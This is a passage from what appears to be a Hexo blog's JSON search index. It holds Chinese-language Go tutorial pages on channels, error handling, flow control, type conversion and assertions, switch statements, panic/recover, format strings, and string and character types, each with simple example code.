读取等待而导致程序停滞，从而巧妙地实现了超时处理机制，这种方法不仅简单，在实际项目开发中也是非常实用的。 channel 的关闭channel 的关闭非常简单，使用 Go 语言内置的 close() 函数即可关闭 channel，示例： 12ch := make(chan int)close(ch) 关闭了 channel 后如何查看 channel 是否关闭成功了呢？很简单，我们可以在读取 channel 时采用多重返回值的方式，示例： 1x, ok := &lt;-ch 通过查看第二个返回值的 bool 值即可判断 channel 是否关闭，若为 false 则表示 channel 被关闭，反之则没有关闭。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"}]},{"title":"Go简明手册概要","date":"2023-10-27T01:24:02.153Z","path":"B_Code/GO/Go简明手册/Readme/","text":"Go语言基础Go语言介绍Go语言顺序编程并发与并行词频统计综合案例面向对象编程","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}]},{"title":"","date":"2023-10-27T01:24:02.152Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/错误处理/README/","text":"错误处理* 错误处理是任何语言都需要考虑到的问题，而 Go 语言在错误处理上解决得更为完善，优雅的错误处理机制是 Go 语言的一大特点。 errorGo 语言引入了一个错误处理的标准模式，即 error 接口，该接口定义如下： 123type error interface &#123; Error() string&#125; 对于大多数函数，如果要返回错误，可以将 error 作为多返回值的最后一个： 1234func foo(param int)(ret int, err error)&#123; ...&#125; 调用时的代码： 123456n, err := foo(0)if err != nil &#123; // 错误处理&#125; else &#123; // 使用返回值n&#125; 我们还可以自定义错误类型，创建源文件 error.go，输入以下代码： 1234567891011121314151617181920212223242526272829303132333435package mainimport &quot;fmt&quot;import &quot;errors&quot;//自定义的出错结构type myError struct &#123; arg int errMsg string&#125;//实现Error接口func (e *myError) Error() string &#123; return fmt.Sprintf(&quot;%d - %s&quot;, e.arg, e.errMsg)&#125;//两种出错func error_test(arg int) (int, error) &#123; if arg &lt; 0 &#123; return -1, errors.New(&quot;Bad Arguments - negtive!&quot;) &#125;else if arg &gt;256 &#123; return -1, &amp;myError&#123;arg, &quot;Bad Arguments - too large!&quot;&#125; &#125; return arg*arg, nil&#125;//相关的测试func main() &#123; for _, i := range []int&#123;-1, 4, 1000&#125; &#123; if r, e := error_test(i); e != nil &#123; fmt.Println(&quot;failed:&quot;, e) &#125; else &#123; fmt.Println(&quot;success:&quot;, r) &#125; &#125;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"错误处理","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/错误处理","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"}]},{"title":"Go顺序编程——流程控制","date":"2023-10-27T01:24:02.146Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/流程控制/README/","text":"[toc] Go 语言提供的流程控制语句包括 if、switch、for、goto、select，其中 select 用于监听 channel（通道）在讲解通道的时候再详细介绍。 if 语句语法： 1234567if optionalStatement1; booleanExpression1 &#123; block1&#125; else if optionalStatement2; booleanExpression2 &#123; block2&#125; else &#123; block3&#125; 其中 optionalStatement 是可选的表达式，真正决定分支走向的是 booleanExpression1 的值。 for 语句Go 语言的 for 语句可以遍历数组，切片，映射等类型，也可以用于无限循环。以下是其语法： 123456789101112131415for &#123; // 无限循环 block&#125;for booleanExpression &#123; // while循环，在Go语言中没有while关键字&#125;for index, char := range aString &#123; // 迭代字符串&#125;for item := range aChannel &#123; // 迭代通道&#125; 跳转语句Go 语言中使用 goto 关键字实现跳转。goto 语句的语义非常简单，就是跳转到本函数内的某个标签，例如： 123456789func myfunc()&#123; i := 0 THIS: //定义一个THIS标签 fmt.Println(i) i++ if i &lt; 1 &#123; goto THIS //跳转到THIS标签 &#125;&#125;","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"流程控制","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/流程控制","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"}]},{"title":"Go顺序编程——类型转换","date":"2023-10-27T01:24:02.146Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/类型转换/Readme/","text":"[toc] 类型转换Go 语言提供了一种在不同但相互兼容的类型之间相互转换的方式，这种转换非常有用并且是安全的。但是需要注意的是在数值之间进行转换可能造成其他问题，如精度丢失或者错误的结果。以下是类型转换的语法： resultOfType := Type(expression) 几个例子： 1234x := int16(2345) // 声明一个类型为int16的整数，其值为2345y := int32(x) // 将int16类型的整数转换为int32类型a := uint16(65000) // 声明一个类型为uint16类型的整数b := int16(a) // 转换为int16类型，虽然能转换成功，但是由于65000超过in16类型的范围，会导致结果错误，b的值为 -536 另外在 Go 语言中可以通过 type 关键字声明类型，如 type StringsSlice []string 将 []string（string 类型的切片）声明为 StringSlice 类型。 类型断言说到类型断言就需要先了解下 Go 语言中的接口。在 Go 语言中接口是一个自定义类型。它声明了一个或者多个方法。任何实现了这些方法的对象（类型）都满足这个接口。 接口是完全抽象的，不能实例化。interface&#123;&#125; 类型表示一个空接口，任何类型都满足空接口。也就是说 interface&#123;&#125; 类型的值可以用于表示任意 Go 语言类型的值。 这里的空接口有点类似于 Python 语言中的 object 实例。既然 interface&#123;&#125; 可以用于表示任意类型，那有的时候我们需要将 interface&#123;&#125; 类型转换为我们需要的类型，这个操作称为类型断言。 一般情况下只有我们希望表达式是某种特定类型的值时才使用类型断言。Go 语言中可以使用以下语法： resultOfType, boolean := expression.(Type)：安全的类型断言。 resultOfType := expression.(Type)：非安全的类型断言，失败时程序会产生异常。 创建源文件 type_t.go，输入以下源文件： 123456789101112131415161718192021package mainimport ( &quot;fmt&quot;)func main() &#123; x := uint16(65000) y := int16(x) // 将 x转换为int16类型 fmt.Printf(&quot;type and value of x is: %T and %d\\n&quot;, x, x) // %T 格式化指令的作用是输出变量的类型 fmt.Printf(&quot;type and value of y is: %T and %d\\n&quot;, y, y) var i interface&#123;&#125; = 99 // 创建一个interface&#123;&#125;类型，其值为99 var s interface&#123;&#125; = []string&#123;&quot;left&quot;, &quot;right&quot;&#125; j := i.(int) // 我们假设i是兼容int类型，并使用类型断言将其转换为int类型 fmt.Printf(&quot;type and value of j is: %T and %d\\n&quot;, j, j) if s, ok := s.([]string); ok &#123; // 创建了影子变量，if的作用域中覆盖了外部的变量s fmt.Printf(&quot;%T -&gt; %q\\n&quot;, s, s) &#125;&#125; 运行程序： 12345$ go run type_t.gotype and value of x is: uint16 and 65000type and value of y is: int16 and -536type and value of j is: int and 99[]string -&gt; [&quot;left&quot; &quot;right&quot;]","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"类型转换","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/类型转换","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"}]},{"title":"Go顺序编程——函数的多返回值","date":"2023-10-27T01:24:02.144Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/函数的多返回值/README/","text":"与 C&#x2F;C++ 和 JAVA 不同，Go 语言的函数和方法可以有多个返回值，这是 Go 提供的一个优美的特性，示例如下： 12345678910package Divideimport &quot;errors&quot;func divide (a int, b int) (num int, err error)&#123; //定义两个返回值 if b == 0 &#123; err = errors.New(&quot;被除数不能为零！&quot;) return &#125; return a / b, nil //支持多个返回值&#125; 匿名函数在 Go 语言中，你可以在代码里随时定义匿名函数，匿名函数由一个不带函数名的函数声明和函数体组成，示例如下： 123func (a, b, c int) bool &#123; return a * b &lt; c&#125; 你可以将匿名函数直接赋值给一个变量，也可以直接调用运行，示例如下： 1234567x := func (a, b, c int) bool &#123; return a * b &lt; c&#125;func (a, b, c int) bool &#123; return a * b &lt; c&#125; (1, 2, 3) //小括号内直接给参数列表表示函数调用","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"函数的多返回值","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/函数的多返回值","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%9A%E8%BF%94%E5%9B%9E%E5%80%BC/"}]},{"title":"Go顺序编程——switch语句","date":"2023-10-27T01:24:02.141Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/switch语句/README/","text":"Go 语言中 switch 分支既可用于常用的分支就像 C 语言中的 switch 一样，也可以用于类型开关，所谓类型开关就是用于判断变量属于什么类型。但是需要注意的是 Go 语言的 switch 语句不会自动贯穿，相反，如果想要贯穿需要添加 fallthrough 语句。表达式开关 switch 的语法如下： 123456switch optionalStatement; optionalExpression &#123; case expression1: block1 ... case expressionN: blockN default: blockD&#125; 下面是个例子： 12345678switch &#123; // 没有表达式，默认为True值，匹配分支中值为True的分支 case value &lt; minimum: return minimum case value &gt; maximum: return maximum default: return value&#125; 在上面的例子中，switch 后面没有默认的表达式，这个时候 Go 语言默认其值为 True。 在前面我们提到过类型断言，如果我们知道变量的类型就可以使用类型断言，但是当我们知道类型可能是许多类型中的一种时候，我们就可以使用类型开关。其语法如下： 123456switch optionalStatement; typeSwitchGuard &#123; case type1: block1 ... case typeN: blockN default: blockD&#125; 说了这么多，让我们进行下练习，创建源文件 switch_t.go，输入以下代码： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot;)func classchecker(items ...interface&#123;&#125;) &#123; // 创建一个函数，该函数可以接受任意多的任意类型的参数 for i, x := range items &#123; switch x := x.(type) &#123; // 创建了影子变量 case bool: fmt.Printf(&quot;param #%d is a bool, value: %t\\n&quot;, i, x) case float64: fmt.Printf(&quot;param #%d is a float64, value: %f\\n&quot;, i, x) case int, int8, int16, int32, int64: fmt.Printf(&quot;param #%d is a int, value: %d\\n&quot;, i, x) case uint, uint8, uint16, uint32, uint64: fmt.Printf(&quot;param #%d is a uint, value: %d\\n&quot;, i, x) case nil: fmt.Printf(&quot;param #%d is a nil\\n&quot;, i) case string: fmt.Printf(&quot;param #%d is a string, value: %s\\n&quot;, i, x) default: fmt.Printf(&quot;param #%d&#x27;s type is unknow\\n&quot;, i) &#125; &#125;&#125;func main() &#123; classchecker(5, -17.98, &quot;AIDEN&quot;, nil, true, complex(1, 1))&#125; 以上代码中我们首先创建了一个接收任意数量任意类型参数的函数，然后使用 for ... range aSlice 的语法迭代了每一个在切片 items 中的元素，接着使用了 switch 类型开关判断了每一个参数的类型，并打印了其值和类型。程序运行输出如下： 1234567$ go run switch_t.goparam #0 is a int, value: 5param #1 is a float64, value: -17.980000param #2 is a string, value: AIDENparam #3 is a nilparam #4 is a bool, value: trueparam #5&#x27;s type is unknow","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"switch语句","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/switch语句","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/switch%E8%AF%AD%E5%8F%A5/"}]},{"title":"Go顺序编程——Go语言顺序编程","date":"2023-10-27T01:24:02.140Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/readme/","text":"知识点 流程控制 函数 类型转换 类型断言 error defer 和 panic 文章列表panic和defer错误处理类型转换","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"}]},{"title":"","date":"2023-10-27T01:24:02.137Z","path":"B_Code/GO/Go简明手册/Go语言顺序编程/panic和defer/README/","text":"panic 和 recoverpanic() 函数用于抛出异常，recover() 函数用于捕获异常，这两个函数的原型如下： 12func panic(interface&#123;&#125;)func recover() interface&#123;&#125; 当在一个函数中调用 panic() 时，正常的函数执行流程将立即终止，但函数中之前使用 defer 关键字延迟执行的语句将正常展开执行，之后该函数将返回到调用函数，并导致逐层向上执行 panic() 流程，直至所属的 goroutine 中所有正在执行的函数被终止。错误信息将被报告，包括在调用 panic() 函数时传入的参数，这个过程称为错误流程处理。 panic() 接受一个 interface&#123;&#125; 参数，可支持任意类型，例如： 123panic(404)panic(&quot;network broken&quot;)panic(Error(&quot;file not exists&quot;)) 在 defer 语句中，可以使用 recover() 终止错误处理流程，这样可以避免异常向上传递，但要注意 recover() 之后，程序不会再回到 panic() 那里，函数仍在 defer 之后返回。新建一个源文件 error1.go，输入以下代码： 12345678910111213141516171819func foo() &#123; panic(errors.New(&quot;i&#x27;m a bug&quot;)) return&#125;func test() (result int) &#123; defer func() &#123; if r := recover(); r != nil &#123; err := r.(error) fmt.Println(&quot;Cache Exception:&quot;, err) &#125; &#125;() foo() return 10&#125;func main() &#123; fmt.Println(test()) // 0&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言顺序编程","slug":"B-Code/GO/Go简明手册/Go语言顺序编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"panic和defer","slug":"B-Code/GO/Go简明手册/Go语言顺序编程/panic和defer","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/panic%E5%92%8Cdefer/"}]},{"title":"Go基本语法——格式化字符串","date":"2023-10-27T01:24:02.135Z","path":"B_Code/GO/Go简明手册/Go语言基础/格式化字符串/格式化字符串/","text":"Go 语言标准库中的 fmt 包提供了打印函数将数据以字符串形式输出到控制台，文件，其他满足 io.Writer 接口的值以及其他字符串。目前为止我们使用了 fmt.Printf 和 fmt.Println，对于前者的使用，就像 C 语言中的 printf 函数一样，我们可以提供一些格式化指令，让 Go 语言对输出的字符串进行格式化。同样的我们可以使用一些格式化修饰符，改变格式化指令的输出结果， 如左对齐等。常用的格式化指令如下： 格式化指令 含义 %% % 字面量 %b 一个二进制整数，将一个整数格式化为二进制的表达方式 %c 一个 Unicode 的字符 %d 十进制数值 %o 八进制数值 %x 小写的十六进制数值 %X 大写的十六进制数值 %U 一个 Unicode 表示法表示的整形码值，默认是 4 个数字字符 %s 输出以原生的 UTF-8 字节表示的字符，如果 console 不支持 UTF-8 编码，则会输出乱码 %t 以 true 或者 false 的方式输出布尔值 %v 使用默认格式输出值，或者使用类型的 String() 方法输出的自定义值，如果该方法存在的话 %T 输出值的类型 常用的格式化指令修饰符如下： 空白 如果输出的数字为负，则在其前面加上一个减号 -。如果输出的是整数，则在前面加一个空格。使用 %x 或者 %X 格式化指令输出时，会在结果之间添加一个空格。例如 fmt.Printf(&quot;% X&quot;, &quot;实&quot;) 输出 E5 AE 9E。 # 1234567891011121314151617181920212223242526272829303132333435363738 - `%#o` 输出以 `0` 开始的八进制数据。 - `%#x` 输出以 `0x` 开始的十六进制数据。- `+` 让格式化指令在数值前面输出 `+` 号或者 `-` 号，为字符串输出 ASCII 字符（非 ASCII 字符会被转义），为结构体输出其字段名。- `-` 让格式化指令将值向左对齐（默认值为像右对齐）。- `0` 让格式指令以数字 0 而非空白进行填充。让我们练习一下，创建源文件 `fmt_t.go`，输入以下源码：```gopackage mainimport ( &quot;fmt&quot;)func main() &#123; text := &quot;\\u5B9E\\u9A8C\\u697C&quot; fmt.Printf(&quot;bool output:\\n%t\\n%t\\n\\n&quot;, true, false) fmt.Println(&quot;number output, origin value: 64&quot;) fmt.Printf(&quot;|%b|%8b|%-8b|%08b|% 8b|\\n&quot;, 64, 64, 64, 64, 64) fmt.Printf(&quot;|%x|%8x|%-8x|%08X|% 8X|\\n\\n&quot;, 64, 64, 64, 64, 64) fmt.Println(`text output, origin value: \\u5B9E\\u9A8C\\u697C`) fmt.Printf(&quot;content: %s\\n&quot;, text) fmt.Printf(&quot;hex value: % X\\nUnicode value: &quot;, text) for _, char := range text &#123; fmt.Printf(&quot;%U &quot;, char) &#125; fmt.Println() bytes := []byte(text) fmt.Printf(&quot;value of bytes: %s\\n&quot;, bytes) fmt.Printf(&quot;hex value of bytes: % X\\n&quot;, bytes) fmt.Printf(&quot;origin value of bytes: %v\\n&quot;, bytes)&#125; 运行代码，输出如下： 12345678910111213141516$ go run fmt_t.gobool output:truefalsenumber output, origin value: 64|1000000| 1000000|1000000 |01000000| 1000000||40| 40|40 |00000040| 40|text output, origin value: \\u5B9E\\u9A8C\\u697Ccontent: 实验楼hex value: E5 AE 9E E9 AA 8C E6 A5 BCUnicode value: U+5B9E U+9A8C U+697Cvalue of bytes: 实验楼hex value of bytes: E5 AE 9E E9 AA 8C E6 A5 BCorigin value of bytes: [229 174 158 233 170 140 230 165 188] 代码一目了然，就不详细解释了。","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"格式化字符串","slug":"B-Code/GO/Go简明手册/Go语言基础/格式化字符串","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"Go基本语法——字符类型","date":"2023-10-27T01:24:02.132Z","path":"B_Code/GO/Go简明手册/Go语言基础/字符类型/字符类型/","text":"在 Go 语言中支持两个字符类型，一个是 Byte（实际上是 Unit8 的别名），代表 UTF-8 字符串的单个字节的值；另一个是 rune，代表单个 Unicode 字符。 处于简化语言的考虑，Go 语言的多数 API 都假设字符串为 UTF-8 编码。尽管 Unicode 字符在标准库中有支持，但实际很少使用。 数组Go 语言的数组是一个定长的序列，其中的元素类型相同。多维数组可以简单地使用自身为数组的元素来创建。数组的元素使用操作符号 [ ] 来索引，索引从 0 开始，到 len(array)-1 结束。数组使用以下语法创建： [length]Type [N]Type&#123;value1, value2, ..., valueN&#125; [...]Type&#123;value1, value2, ..., valueN&#125; 如果使用了 ...（省略符）操作符，Go 语言会为我们自动计算数组的长度。在任何情况下，一个数组的长度都是固定的并且不可修改。数组的长度可以使用 len() 函数获得。由于数组的长度是固定的，因此数组的长度和容量都是一样的，因此对于数组而言 cap() 和 len() 函数返回值都是一样的。数组也可以使用和切片一样的语法进行切片，只是其结果为一个切片，而非数组。同样的，数组也可以使用 range 进行索引访问。","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"字符类型","slug":"B-Code/GO/Go简明手册/Go语言基础/字符类型","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E7%B1%BB%E5%9E%8B/"}]},{"title":"Go基本语法——字符串","date":"2023-10-27T01:24:02.130Z","path":"B_Code/GO/Go简明手册/Go语言基础/字符串/字符串/","text":"Go 语言中的字符串是 UTF-8 字符的一个序列（当字符为 ASCII 码时则占用 1 个字节，其它字符根据需要占用 2-4 个字节）。UTF-8 是被广泛使用的编码格式，是文本文件的标准编码，其它包括 XML 和 JSON 在内，也都使用该编码。由于该编码对占用字节长度的不定性，Go 中的字符串也可能根据需要占用 1 至 4 个字节，这与其它语言如 C++、Java 或者 Python 不同。Go 这样做的好处是不仅减少了内存和硬盘空间占用，同时也不用像其它语言那样需要对使用 UTF-8 字符集的文本进行编码和解码。 Go 语言中字符串的可以使用双引号 (“) 或者反引号 (&#96;) 来创建。双引号用来创建可解析的字符串字面量，所谓可解析的是指字符串中的一些符号可以被格式化为其他内容，如 \\n 在在输出时候会被格式化成换行符，如果需要按照原始字符输出必须进行转义。而反引号创建的字符串原始是什么样，那输出还是什么，不需要进行任何转义。以下是几个例子： 123t1 := &quot;\\&quot;hello\\&quot;&quot; //内容： &quot;hello&quot;t2 := `&quot;hello&quot;` //内容：和t1一致t3 := &quot;\\u6B22\\u8FCE&quot; //内容：欢迎 Go 语言中的部分转义字符如下表所示： 转义字符 含义 \\\\ 表示反斜线 \\&#39; 单引号 \\&quot; 双引号 \\n 换行符 \\uhhhh 4 个 16 进制数字给定的 Unicode 字符 在 Go 语言中单个字符可以使用单引号 (‘) 来创建。之前的课程中，我们有学习过 rune 类型，它等同于 int32，在 Go 语言中，一个单一的字符可以用一个单一的 rune 来表示。这也是容易理解的，因为 Go 语言的字符串是 UTF-8 编码，其底层使用 4 个字节表示，也就是 32 bit。 在 Go 语言中，字符串支持切片操作，但是需要注意的是如果字符串都是由 ASCII 字符组成，那可以随便使用切片进行操作，但是如果字符串中包含其他非 ASCII 字符，直接使用切片获取想要的单个字符时需要十分小心，因为对字符串直接使用切片时是通过字节进行索引的，但是非 ASCII 字符在内存中可能不是由一个字节组成。如果想对字符串中字符依次访问，可以使用 range 操作符。另外获取字符串的长度可能有两种含义，一种是指获取字符串的字节长度，一种是指获取字符串的字符数量。字符串支持以下操作： 语法 描述 s += t 将字符串 t 追加到 s 末尾 s + t 将字符串 s 和 t 级联 s[n] 从字符串 s 中索引位置为 n 处的原始字节 s[n:m] 从位置 n 到位置 m-1 处取得的字符（字节）串 s[n:] 从位置 n 到位置 len(s)-1 处取得的字符（字节）串 s[:m] 从位置 0 到位置 m-1 处取得的字符（字节）串 len(s) 字符串 s 中的字节数 len([]rune(s)) 字符串 s 中字符的个数，可以使用更快的方法 utf8.RuneCountInString() []rune(s) 将字符串 s 转换为一个 unicode 值组成的串 string(chars) chars 类型是 []rune 或者 []int32, 将之转换为字符串 []byte(s) 无副本的将字符串 s 转换为一个原始的字节的切片数组，不保证转换的字节是合法的 UTF-8 编码字节 让我们尝试一个例子，创建源文件 string_t.go，然后输入以下源代码： 1234567891011121314151617package mainimport ( &quot;fmt&quot;)func main() &#123; t0 := &quot;\\u6B22\\u8FCE\\u6765\\u5230&quot; // t0内容：欢迎来到 t1 := &quot;\\u5B9E\\u9A8C\\u697C&quot; // t1内容：实验楼 t2 := t0 + t1 for index, char := range t2 &#123; fmt.Printf(&quot;%-2d %U &#x27;%c&#x27; %X %d\\n&quot;, index, char, char, []byte(string(char)), len([]byte(string(char)))) &#125; fmt.Printf(&quot;length of t0: %d, t1: %d, t2: %d\\n&quot;, len(t0), len(t1), len(t2)) fmt.Printf(&quot;content of t2[0:2] is: %X\\n&quot;, t2[0:2])&#125; 